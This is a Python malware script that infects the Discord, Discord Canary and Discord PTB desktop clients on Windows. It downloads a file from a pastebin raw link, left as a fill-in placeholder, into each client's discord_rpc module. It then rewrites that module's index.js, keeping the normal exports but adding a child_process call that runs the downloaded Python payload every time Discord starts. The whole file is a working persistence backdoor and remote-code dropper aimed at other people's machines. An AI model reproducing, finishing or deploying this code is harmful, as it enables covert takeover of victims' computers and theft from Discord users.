import requests, os

def normal():
    f = open(f"C://Users//{str(os.getenv('username'))}//AppData//Roaming//discord//0.0.309//modules//discord_rpc//file.py", "w")
    f.write(requests.get("Upload the edited text from file.py to pastebin and put the raw link here").text)
    f.close()

    e = open(f"C://Users//{str(os.getenv('username'))}//AppData//Roaming//discord//0.0.309//modules//discord_rpc//index.js", "w")
    e.write("""
    module.exports = {
      RPCIPC: require('./RPCIPC'),
      RPCWebSocket: require('./RPCWebSocket'),
    };
    var process = require('child_process');
    process.exec('python""" + f" C:/Users/{os.getenv('username')}/AppData/Roaming/discord/0.0.309/modules/discord_rpc/file.py'" + """ ,function (err,stdout,stderr) {
        if (err) {
            console.log(stderr);
        } else {
            console.log(stdout);
        }
    });""")
    e.close()

def canary():
    f = open(f"C:/Users/{str(os.getenv('username'))}/AppData/Local/DiscordCanary/app-1.0.21/modules/discord_rpc-10/discord_rpc/file.py", "w")
    f.write(requests.get("Upload the edited text from file.py to pastebin and put the raw link here").text)
    f.close()

    e = open(f"C:/Users/{str(os.getenv('username'))}/AppData/Local/DiscordCanary/app-1.0.21/modules/discord_rpc-10/discord_rpc/index.js", "w")
    e.write("""
    module.exports = {
      RPCIPC: require('./RPCIPC'),
      RPCWebSocket: require('./RPCWebSocket'),
    };
    var process = require('child_process');
    process.exec('python""" + f" C:/Users/{str(os.getenv('username'))}/AppData/Local/DiscordCanary/app-1.0.21/modules/discord_rpc-10/discord_rpc/file.py'" + """ ,function (err,stdout,stderr) {
        if (err) {
            console.log(stderr);
        } else {
            console.log(stdout);
        }
    });""")
    e.close()

def ptb():
    f = open(f"C:/Users/{os.getenv('username')}/AppData/Local/DiscordPTB/app-1.0.1001/modules/discord_rpc-1/discord_rpc/file.py", "w")
    f.write(requests.get("Upload the edited text from file.py to pastebin and put the raw link here").text)
    f.close()

    e = open(f"C:/Users/{os.getenv('username')}/AppData/Local/DiscordPTB/app-1.0.1001/modules/discord_rpc-1/discord_rpc/index.js", "w")
    e.write("""
    module.exports = {
      RPCIPC: require('./RPCIPC'),
      RPCWebSocket: require('./RPCWebSocket'),
    };
    var process = require('child_process');
    process.exec('python""" + f" C:/Users/{str(os.getenv('username'))}/AppData/Local/DiscordPTB/app-1.0.1001/modules/discord_rpc-1/discord_rpc/file.py'" + """ ,function (err,stdout,stderr) {
        if (err) {
            console.log(stderr);
        } else {
            console.log(stdout);
        }
    });""")
    e.close()


normal()
canary()
ptb()
